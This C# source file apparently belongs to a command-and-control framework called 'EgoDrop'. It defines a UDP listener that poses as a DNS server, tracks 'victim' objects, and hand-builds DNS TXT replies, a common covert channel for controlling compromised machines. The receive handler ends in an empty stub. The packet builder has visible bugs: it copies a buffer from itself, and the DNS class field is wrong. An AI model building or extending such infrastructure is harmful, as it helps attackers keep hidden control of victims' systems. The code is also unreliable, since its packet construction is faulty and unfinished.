using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    internal class clsUdpListener : clsListener
    {
        private UdpClient m_udpClient { get; set; }
        public Dictionary<string, clsVictim> m_dicVictim = new Dictionary<string, clsVictim>();

        public clsUdpListener(string szName, int nPort, string szDescription)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_Protocol = clsSqlite.enListenerProtocol.DNS;
            m_stListener = new clsSqlite.stListener(m_szName, m_Protocol, m_nPort, m_szDescription, DateTime.Now);

            m_udpClient = new UdpClient(m_nPort);
        }

        public override void fnStart()
        {
            //base.fnStart();

            m_udpClient.BeginReceive(new AsyncCallback(fnReceiveCallback), null);
            m_bIsListening = true;
        }

        public override void fnStop()
        {
            //base.fnStop();

            m_udpClient.Close();
            m_bIsListening = false;
        }

        public byte[] fnabBuildDnsResponse(byte[] abQuery, string szTextData)
        {
            byte[] abHeader = new byte[abQuery.Length];
            Array.Copy(abQuery, abHeader, abQuery.Length);
            abHeader[2] = 0x81; //Flags: Standard query response, recursion not available.
            abHeader[3] = 0x80;

            int nQnameEnd = 12;
            while (abQuery[nQnameEnd] != 0)
                nQnameEnd++;

            int nQEnd = nQnameEnd + 5;

            byte[] abQuestion = new byte[nQEnd - 12];
            Array.Copy(abQuestion, 12, abQuestion, 0, abQuestion.Length);

            //TXT record.
            byte[] abTxtBytes = Encoding.UTF8.GetBytes(szTextData);
            byte[] abTxtRecord = new byte[11 + abTxtBytes.Length];

            Array.Copy(abQuestion, 0, abTxtRecord, 0, abQuestion.Length);

            abTxtRecord[abQuestion.Length] = 0x00; //type: TXT
            abTxtRecord[abQuestion.Length + 1] = 0x10;
            abTxtRecord[abQuestion.Length + 2] = 0x00; //class IN
            abTxtRecord[abQuestion.Length + 3] = 0x10;
            abTxtRecord[abQuestion.Length + 4] = 0x00; //TTL
            abTxtRecord[abQuestion.Length + 5] = 0x00;
            abTxtRecord[abQuestion.Length + 6] = 0x00;
            abTxtRecord[abQuestion.Length + 7] = 0x3C; //TTL = 60
            abTxtRecord[abQuestion.Length + 8] = (byte)(abTxtBytes.Length + 1);
            abTxtRecord[abQuestion.Length + 9] = (byte)abTxtBytes.Length;

            Array.Copy(abTxtBytes, 0, abTxtRecord, abQuestion.Length + 10, abTxtBytes.Length);

            byte[] abResponse = new byte[nQEnd + abTxtRecord.Length];
            Array.Copy(abHeader, 0, abResponse, 0, 12);
            abResponse[6] = 0x00;
            abResponse[7] = 0x01;

            Array.Copy(abQuery, 12, abResponse, 12, nQEnd - 12);
            Array.Copy(abTxtRecord, 0, abResponse, nQEnd, abTxtRecord.Length);

            return abResponse;
        }

        private void fnReceiveCallback(IAsyncResult ar)
        {
            if (!m_bIsListening)
                return;

            IPEndPoint remoteEP = null;
            byte[] abRequest = { };

            try
            {
                abRequest = m_udpClient.EndReceive(ar, ref remoteEP);
            }
            catch (ObjectDisposedException)
            {
                return;
            }
            catch (Exception ex)
            {
                if (m_bIsListening)
                    m_udpClient.BeginReceive(new AsyncCallback(fnReceiveCallback), null);

                return;
            }

            try
            {

            }
            catch (Exception ex)
            {

            }
        }
    }
}
